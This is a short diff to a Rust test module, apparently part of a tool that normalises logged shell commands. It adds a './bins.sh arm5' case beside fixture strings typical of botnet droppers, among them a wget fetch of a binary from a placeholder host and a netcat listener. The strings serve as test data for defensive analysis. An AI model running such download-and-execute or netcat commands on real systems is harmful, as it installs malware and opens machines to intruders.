@@ -555,6 +555,7 @@ mod tests {
         for kept in [
             "wget http://<ip>/bins/x86_64",
             "./bins.sh arm7",
+            "./bins.sh arm5",
             "sleep 30",
             "nc -l -p 22",
             "echo > /dev/ttyS0",
@@ -565,6 +566,7 @@ mod tests {
         ] {
             assert_eq!(normalize(kept), kept);
         }
+        assert_ne!(normalize("./bins.sh arm5"), normalize("./bins.sh arm7"));
         // A word without a digit is a word, whatever its letters; a run of digits is a number.
         assert_eq!(normalize("echo decade"), "echo decade");
         assert_eq!(normalize("sha256sum f"), "sha256sum f");
